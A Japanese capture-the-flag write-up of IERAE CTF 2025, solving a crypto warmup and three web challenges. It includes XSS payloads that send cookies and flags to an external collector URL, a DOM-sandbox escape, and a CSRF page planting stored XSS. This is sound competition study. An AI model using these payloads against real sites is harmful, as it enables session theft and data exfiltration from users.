---
title: IERAE CTF 2025 Writeup
date: 2025-06-22
layout: writeup
rank: 5
total_teams: 538
language: ja
tags:
  - Web
  - Crypto
---

# まえがき

IERAE CTF 2025 にチームsknbで参加して5位/538チームでした。チームメンバーが強かったです。
個人としてはcryptoのwarmup問題の肝の部分と、web問を2問解きました。upsolveしたものも合わせて計4問のwriteupになります。
![](/assets/img/ierae_ctf_2025/b2bf8b1eb767-20250622.png)

# Writeup

## [crypto, warmup] Baby MSD (149 solves)

cryptoのwarmup問。2000個の大きいランダムな数`secret`を任意の`M`で割り、この`secret % M`の最上位桁の最頻値を当てる、というステージを100回繰り返せばflagが得られる。ただし、`M >= 10^30`という制約がある。

```py
#!/usr/bin/env python3

from sys import exit
from random import randint

def stage():
  digit_counts = [0 for i in range(10)]

  for i in range(2000):
    secret = randint(10 ** 60, 10 ** 100)
    M = int(input("Enter mod: "))
    if M < 10 ** 30:
      print("Too small!")
      exit(1)

    msd = str(secret % M)[0]
    digit_counts[int(msd)] += 1

  choice = int(input("Which number (1~9) appeared the most? : "))
  for i in range(10):
    if digit_counts[choice] < digit_counts[i]:
      print("Failed :(")
      exit(1)

  print("OK")

def main():
  for i in range(100):
    print("==== Stage {} ====\n".format(i+1))
    stage()

  print("You did it!")
  with open("flag.txt", "r") as f:
    print(f.read())

if __name__ == '__main__':
  main()
```

ここで`M = 2*10^k`の時、当然に`0 <= (secret % M) < 2*10^k`となる。`10^k <= (secret % M) < 2*10^k`の時、最上位桁は1となるので、`secret`がランダムなら50%以上の確率で最上位桁が1になる。
これを2000回繰り返せば、大数の法則によって最頻値が1になる確率は十分高いと期待できる。よって、ひたすら`2*10^30`で割り続けて1を答え続ければ良い。

以上より、スクリプトを書いてローカルで通ることを確認したが、リモートだとタイムアウトになってしまった。2000回の通信を100ステージ繰り返そうとしているのでそりゃそうという話だが。
ここで詰まっていたらチームメイトが良い感じに改善してくれた。最終的なsolverはこうなる。

```py
#!/usr/bin/env python3
from pwn import *

def main():
    conn = remote('35.200.10.230', 12343)
    MOD = 2*10**30

    print("Connected to the service")

    for stage in range(100):
        payload = (str(MOD)+"\n") * 2000
        conn.recvuntil(b"Enter mod: ")
        conn.send(payload.encode())

        for _ in range(1999):
            conn.recvuntil(b"Enter mod: ")

        conn.recvuntil(b"Which number (1~9) appeared the most? : ")
        conn.sendline(str(1).encode())

        conn.recvuntil(b"OK")
        print(f"Stage {stage + 1} Completed")

    # print flag
    print(conn.recvuntil(b"}").decode())

if __name__ == '__main__':
    main()
```

タイムアウトになることなく、無事flagが得られた。
`IERAE{bab00_gu0ooo_g00_47879e28a162}`

## [web, warmup] Warmdown (135 solves)

markdownを入力してXSSを発火させる問題。どのようなhtmlにパースされるかまで表示してくれるらしい。親切すぎる。
![](/assets/img/ierae_ctf_2025/ae5bb9db9f2f-20250622.png)

ソースコードを見る。`<>`が`＜＞`に置換されているので、単純にhtmlタグを挿入してXSSを発火させるのは難しそう。

```js
import fastify from "fastify";
import * as marked from "marked";
import path from "node:path";

const app = fastify();

app.register(await import("@fastify/static"), {
  root: path.join(import.meta.dirname, "public"),
  prefix: "/",
});

const sanitize = (unsafe) => unsafe.replaceAll("<", "＜").replaceAll(">", "＞");

const escapeHtml = (str) =>
  str
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");

const unescapeHtml = (str) =>
  str
    .replaceAll("&amp;", "&")
    .replaceAll("&lt;", "<")
    .replaceAll("&gt;", ">")
    .replaceAll("&quot;", '"')
    .replaceAll("&#039;", "'");

app.get("/render", async (req, reply) => {
  const markdown = sanitize(String(req.query.markdown));
  if (markdown.length > 1024) {
    return reply.status(400).send("Too long");
  }

  const escaped = escapeHtml(marked.parse(markdown));
  const unescaped = unescapeHtml(escaped);

  return { escaped, unescaped };
});

app.listen({ port: 3000, host: "0.0.0.0" });
```

ざっと眺めて、markdownでは画像のalt属性の値を設定できることを思い出す。例えば`![hoge](https://example.com)`を入力してみると、alt属性の値が`hoge`になっていることが分かる。
![](/assets/img/ierae_ctf_2025/f2ad8085e348-20250622.png)

ここにバックスラッシュを仕込むとalt属性値の終わりのダブルクオーテーションをエスケープできないかと思いつき、試してみる。`![\" onerror="alert(1)](x)`を入力すると、狙い通りにalertが発火した。
![](/assets/img/ierae_ctf_2025/0cb74de96f3b-20250622.png)

あとはcookieを外部に送信するpayloadを組み立て、adminに報告すれば良い。

```
http://web:3000/?markdown=%21%5B%5C%22+onerror%3D%22fetch%28%27https%3A%2F%2Fxxxxxxxx.m.pipedream.net%3Ff%3D%27%2Bdocument.cookie%29%5D%28%29
```

flagが得られた。
`IERAE{I_know_XSS_is_the_m0st_popular_vu1nerabili7y}`

## [web, hard] canvasbox (16 solves)

任意のjavascriptが実行できるが、`prototype instanceof Node || value === DOMParser`を満たす要素のpropertyが全て削除されている。この状況で`canvas.getContext("2d").font`に埋め込まれたflagをどうにか窃取するという問題。

```html
<!DOCTYPE html>
<body>
  <h1>XSS Playground</h1>
  <script>
    (() => {
      const flag = localStorage.getItem("flag") ?? "this_is_a_flag";
      localStorage.removeItem("flag");

      const canvas = document.createElement("canvas");
      canvas.id = "flag";
      canvas.getContext("2d").font = `1px "${flag}"`; // :)
      document.body.appendChild(canvas);

      delete window.open;

      const removeKey = (obj, key) => {
        delete obj[key];
        if (key in obj) {
          Object.defineProperty(obj, key, {});
        }
      };

      for (const descriptor of Object.values(
        Object.getOwnPropertyDescriptors(window)
      )) {
        const value = descriptor.value;
        const prototype = value?.prototype;

        if (prototype instanceof Node || value === DOMParser) {
          // Delete all the properties
          for (const key of Object.getOwnPropertyNames(value)) {
            removeKey(value, key);
          }
          for (const key of Object.getOwnPropertyNames(prototype)) {
            removeKey(prototype, key);
          }
        }
      }
    })();

    const params = new URLSearchParams(location.search);
    const xss = params.get("xss") ?? "console.log(1337)";

    eval(xss); // Get the flag!
  </script>
</body>
```

いくつかのステップに分けて解説する。

### Step.1 `<canvas id="flag">`の取得

`document.getElementById()`が消されており、一見`<canvas id="flag">`を取得することができないように見える。
しかし、html要素はグローバルスコープの`window`にプロパティとして登録されるので、例えば`window.flag`で取得することができる。
![](/assets/img/ierae_ctf_2025/937161b5e1f7-20250622.png)

### Step.2 `getContext()`の復元

`canvas.getContext("2d").font`でflagが取得できるはずだったが、当然のように`getContext()`も消されている。これをどうにかして復元できれば勝ち。
ちなみに、javascriptにはそのpropertyが本当にそのobjectのものかを検証する、Brand Checkという機構があるらしい。よって、いい感じのobjectの中にある`OffscreenCanvas.prototype.getContext`などを`HTMLCanvasElement.prototype.getContext`へ借用しても期待通りの挙動にはならず、Illegal invocationエラーが発生する。これは`Object.defineProperty()`や`Object.setPrototypeOf()`などで差し替えを試みても回避できない。

![](/assets/img/ierae_ctf_2025/89f8bf2beaa2-20250622.png)

よって、どうにかこのBrand Checkを回避して`getContext()`を復元する必要がある。

#### Step.2-1 `<ifame>`の構築

Brand Checkを回避するため、どうにかして`HTMLCanvasElement.prototype.getContext`を用意する必要がある。
propertyが消されているのはこのページだけなので、`window.open()`や`<iframe>`などで新しいページを作成してそこから持ってこれば良さそう。前者は消されているので、使えるpropertyだけでどうにかして`<iframe>`を構築したい。

例によって`document.createElement()`は消されている。そこで色々調べていると、`new Range()).createContextualFragment()`というものがあり、これは`prototype instanceof Node || value === DOMParser`を満たさないので生きていることが分かった。これを用いて`<iframe>`を作成する。

```js
  const ifr = (new Range()).createContextualFragment('<iframe>').firstChild;
  window.flag.parentNode.appendChild(ifr);
```

#### Step.2-2 `ifr.contentWindow`を取得

さて、これで`ifr.contentWindow`を親ページ側で取得できればそこから`getContext()`を使えるようになる訳だが、`contentWindow`も封じられている。
親から子ではなく子から親への発想で、iframe側から親ページに受け渡しする手法が無いか調べると、`parent.postMessage`というものが見つかった。これをiframeの中で実行して親ページで受け取るようにする。とりあえず面倒なので全てを受け渡すようにした。

```js
  const ifr = (new Range()).createContextualFragment('<iframe srcdoc="<script>parent.postMessage(0,\'*\')<\/script>">').firstChild;
  window.flag.parentNode.appendChild(ifr);
  const w = await new Promise(res => addEventListener('message', e => res(e.source), { once: true }));
```

#### Step.2-3 `getContext()`の実行

iframeの中から`HTMLCanvasElement.prototype.getContext`を含むもろもろを持ってくることができたので、この中の`getContext`を`<canvas id="flag">`で実行したい。
`prototype`への代入などでもいい気がするが、`call()`というメソッドを使って実行することにした。これでようやく`window.flag.getContext("2d").font`が取得できた。

```js
  const f = w.HTMLCanvasElement.prototype.getContext.call(window.flag, '2d').font;
```

### Step.3 flagの送信

ここまで来れば勝利も目前、得られたflagを自分のサーバーに送信するだけ。
最終的なpayloadはこうなる。

```js
(async () =>{
  const ifr = (new Range()).createContextualFragment('<iframe srcdoc="<script>parent.postMessage(0,\'*\')<\/script>">').firstChild;
  window.flag.parentNode.appendChild(ifr);
  const w = await new Promise(res => addEventListener('message', e => res(e.source), { once: true }));
  const f = w.HTMLCanvasElement.prototype.getContext.call(window.flag, '2d').font;
  location.href = `https://xxxxxxxx.m.pipedream.net?f=${f}`;
})()
```

これをクエリパラメータにしてadminに報告すると、flagが得られた。

```
http://web:3000?xss=(async () =>{const ifr = (new Range()).createContextualFragment('<iframe srcdoc="<script>parent.postMessage(0,\'*\')<\/script>">').firstChild;window.flag.parentNode.appendChild(ifr);const w = await new Promise(res => addEventListener('message', e => res(e.source), { once: true }));const f = w.HTMLCanvasElement.prototype.getContext.call(window.flag, '2d').font;location.href = `https://xxxxxxxx.m.pipedream.net?f=${f}`;})()
```

`IERAE{DOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOMDOM}`

# Upsolve

## [web, easy] Slide Sandbox (3 solves)

良い感じのスライドパズルを作ることができるアプリ。これ、**easy**タグ付いてたんですが。
![](/assets/img/ierae_ctf_2025/7c28a88872f6-20250622.png)
![](/assets/img/ierae_ctf_2025/582b36e5fddf-20250622.png)

そもそもflagはどこかというと、adminが作成したパズルの`title`にある。パズルを作成してから報告されたURLを見に行くようになっている。

bot.js (抜粋):

```js
  try {
    console.log("Create a flag puzzle");
    const page1 = await context.newPage();
    await page1.goto(APP_URL, { timeout: 3000 });

    await page1.$eval("#new-title", (element, value) => element.value = value, FLAG);
    await page1.$eval("#new-template", element => element.value = `(略)`);
    await page1.$eval("#new-answers", element => element.value = "slide!!!");

    await page1.waitForSelector("#new-button");
    await page1.click("#new-button");
    await sleep(1 * 1000);
    await page1.close();
    await sleep(1 * 1000);

    console.log(`start: ${url}`);
    const page2 = await context.newPage();
    await page2.goto(url, { timeout: 3000 });
    await sleep(5 * 1000);
    await page2.close();
    console.log(`end: ${url}`);
  } catch (e) {
    console.error(e);
  }
```

アプリの方も見ていく。まずはサーバー側だが、`/puzzles`で作成したパズル一覧を取得できるものの、session管理されていて他人が作成したパズルのidは分からないし、分かったところでパズルを見ることはできない。

index.js:

```js
import fastify from "fastify";
import crypto from "node:crypto";
import path from "node:path";

import db from "./db.js";

const app = fastify({});

app.register(await import('@fastify/static'), {
  root: path.join(import.meta.dirname, "public"),
})
app.register(await import("@fastify/formbody"));
app.register(await import("@fastify/cookie"));
app.register(await import("@fastify/session"), {
  secret: crypto.randomBytes(32).toString("base64"),
  cookie: { secure: false, httpOnly: false },
});

app.addHook("preHandler", (req, reply, next) => {
  const userId = req.session.get("userId") ??
    (() => {
      const user = db.createUser();
      req.session.set("userId", user.id);
      return user.id;
    })();

  req.user = db.getUser(userId);
  next();
});

app.get("/", (req, reply) => { reply.sendFile("index.html") });
app.get("/puzzle", (req, reply) => { reply.sendFile("puzzle.html") });

const schema = {
  body: {
    type: "object",
    properties: {
      title: { type: "string", maxLength: 100 },
      template: { type: "string", maxLength: 1000 },
      answers: { type: "string", minLength: 8, maxLength: 8 },
    },
    required: ["title", "template", "answers"],
  },
};

app.post("/create", { schema }, (req, reply) => {
  const title = req.body.title;
  const template = req.body.template.replaceAll("\r", "").replaceAll("\n", "");
  const answers = req.body.answers;

  const puzzle = db.createPuzzle(req.user, {
    title,
    template,
    answers,
  });

  return reply.redirect(`/puzzle?id=${puzzle.id}`);
});

app.get("/puzzles", (req, reply) => {
  reply.send(req.user.getPuzzles().map(({ id, title }) => ({ id, title })));
});

app.get("/puzzles/:id", (req, reply) => {
  const { id } = req.params;
  const puzzle = req.user.getPuzzles().find((puzzle) => puzzle.id === id);
  reply.send({ title: puzzle.title, template: puzzle.template, answers: puzzle.answers });
});

app.listen({ port: 3000, host: "0.0.0.0" });
```

クライアント側も見ると、ユーザーから受け取った`template`をそのまま描画しているので任意のhtmlを挿入できる。
しかし、`<iframe id="frame0" sandbox="allow-same-origin">`によってjavascriptの実行は封じられている。どうやらjavascriptを実行するにはsandbox属性に`allow-scripts`という値が必要らしい。

puzzle.html:

```html
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8" />
  <title>🧩Slide Sandbox🧩</title>
  <style>
    (略)
  </style>
</head>

<body>
  <h1 class="title" id="title"></h1><br>
  <div class="game-area">
    <div class="puzzle-container" id="puzzle">
      <iframe id="frame0" sandbox="allow-same-origin"></iframe>
      <iframe id="frame1" sandbox="allow-same-origin"></iframe>
      <iframe id="frame2" sandbox="allow-same-origin"></iframe>
      <iframe id="frame3" sandbox="allow-same-origin"></iframe>
      <iframe id="frame4" sandbox="allow-same-origin"></iframe>
      <iframe id="frame5" sandbox="allow-same-origin"></iframe>
      <iframe id="frame6" sandbox="allow-same-origin"></iframe>
      <iframe id="frame7" sandbox="allow-same-origin"></iframe>
      <iframe id="frame8" sandbox="allow-same-origin"></iframe>
    </div>
    <div class="message">
      <a href="/">TOP</a>
    </div>
  </div>
</body>

<script>
  let pieces = Array();
  fetch('/puzzles/' + (new URLSearchParams(location.search)).get('id'))
    .then(r => r.json())
    .then(puzzle => {
      document.getElementById('title').innerText = puzzle.title;

      const ans = puzzle.answers.split('').sort(() => Math.random() - 0.5);
      ans.forEach((v, i) => {
        pieces.push(document.createElement("div"));
      })
      pieces.push(document.createElement("div"))

      for (var i = 0; i < frames.length; i++) {
        frames[i].addEventListener("click", slide);
        frames[i].document.body.appendChild(pieces[i]);
      }

      ans.forEach((v, i) => {
        pieces[i].innerHTML = puzzle.template.replaceAll("{{v}}", v);
      })
    });

  function slide(e) {
    (略)
  };
</script>
```

 

ここからCSSでleakするのかなぁなどとずっと悩んでおり、競技時間中には解けなかった。

ということでupsolveする。
まず、パズルに配置する8文字`answers`に注目する。この8文字をsplitしてそれぞれのパネルに入れているわけだが、絵文字などの4バイト文字は`split("")`で複数バイトに分割される。
![](/assets/img/ierae_ctf_2025/6c24af7ad496-20250622.png)

改めて実装を見返すと、`frames.length`は当然9だが、4バイト文字が`answers`に含まれるケースでは`pieces.length`が9以上になることが分かる。

```html
<body>
  <h1 class="title" id="title"></h1><br>
  <div class="game-area">
    <div class="puzzle-container" id="puzzle">
      <iframe id="frame0" sandbox="allow-same-origin"></iframe>
      <iframe id="frame1" sandbox="allow-same-origin"></iframe>
      <iframe id="frame2" sandbox="allow-same-origin"></iframe>
      <iframe id="frame3" sandbox="allow-same-origin"></iframe>
      <iframe id="frame4" sandbox="allow-same-origin"></iframe>
      <iframe id="frame5" sandbox="allow-same-origin"></iframe>
      <iframe id="frame6" sandbox="allow-same-origin"></iframe>
      <iframe id="frame7" sandbox="allow-same-origin"></iframe>
      <iframe id="frame8" sandbox="allow-same-origin"></iframe>
    </div>
    <div class="message">
      <a href="/">TOP</a>
    </div>
  </div>
</body>

<script>
  let pieces = Array();
  fetch('/puzzles/' + (new URLSearchParams(location.search)).get('id'))
    .then(r => r.json())
    .then(puzzle => {
      document.getElementById('title').innerText = puzzle.title;

      const ans = puzzle.answers.split('').sort(() => Math.random() - 0.5); // Sometimes the puzzles are impossible. Forgive please.      
      ans.forEach((v, i) => {
        pieces.push(document.createElement("div"));
      })
      pieces.push(document.createElement("div"))

      for (var i = 0; i < frames.length; i++) {
        frames[i].addEventListener("click", slide);
        frames[i].document.body.appendChild(pieces[i]);
      }

      ans.forEach((v, i) => {
        pieces[i].innerHTML = puzzle.template.replaceAll("{{v}}", v);
      })
    });

  function slide(e) {
    (略)
  };
</script>

</html>
```

`answers`に絵文字を混入させるとどうなるのか試してみる。
![](/assets/img/ierae_ctf_2025/352b73be26ef-20250622.png)

この時、`pieces.length`は7+2で9になっているので、9つのパネル全てに文字が入る。
![](/assets/img/ierae_ctf_2025/6c9dc63984c0-20250622.png)

では`pieces.length`が10以上だとどうなるのか。もちろんパネル(iframe)は9つしかないので溢れてしまうが、この溢れた部分はiframeによるsandbox制限の外側にあるのでXSSが発火してしまう。これは[Xで色々言われているのを見かけた](https://x.com/Satoooon1024/status/1936703301594317119)が、まだあまり理解できていない。

ということで、このような入力でalertが発火した。
![](/assets/img/ierae_ctf_2025/39e0218b648e-20250622.png)

既存のパズルの`title`は`/puzzles`のレスポンスに含まれているので、このようなpayloadをadminに踏んでもらえば勝ち。

```js
fetch('/puzzles').then(r=>r.json()).then(t=>fetch(`https://xxxxxxxx.m.pipedream.net?f=${t[0].title}`))
```

しかし、sessionがあるのでsame-origin、すなわちこのパズルアプリ内からXSSしないといけない。よってCSRFでpayload入りパズルを作り、遷移させる。

ということで、このようなhtmlを置いたサーバーを用意する。問題サーバーがhttpなのでhttpじゃないといけないことに注意。実際に解いた時は適当なVPSを使った。

```html
<!DOCTYPE html>
<html>

<body>
  <main class="container">
    <form id="puzzleForm" method="post" action="http://web:3000/create">
      <input type="text" id="new-title" name="title" value="solution">
      <textarea id="new-template" name="template" rows="5">
        <img src=x onerror="fetch('/puzzles').then(r=>r.json()).then(t=>fetch(`https://xxxxxxxx.m.pipedream.net?f=${t[0].title}`))">
      </textarea>
      <input type="text" id="new-answers" name="answers" value="123456😀😀">
      <button type="submit" id="new-button">Submit</button>
    </form>
  </main>
</body>

<script>
  setTimeout(() => {
    document.getElementById("puzzleForm").submit();
  }, 1000);
</script>

</html>
```

このhtmlのURLをadminに報告すると、

1. flag入りパズル作成
2. このページを訪問
3. payload入りパズル作成、遷移
4. XSS発火

という流れでpayloadを実行させることができる。これでflagが得られた。
`IERAE{HaveYouMadeTheUltimateSlidePuzzle?}`

# あとがき

いやー疲れました。とりあえずwebが2問解けてweb担当としてある程度チームに貢献できたかなぁという気持ちと**easy**って何という気持ちがごちゃごちゃになっています。CTFの後は毎回不完全燃焼かもしれない。upsolveとwriteup執筆までがCTFということで、あと2問のupsolveも頑張ります。
そろそろオンサイト決勝というものに挑戦してみたい気持ちがあるので、もし学生枠でweb要員探してるチームがあればお声かけください。飛び跳ねて喜びます。よろしくお願いします。
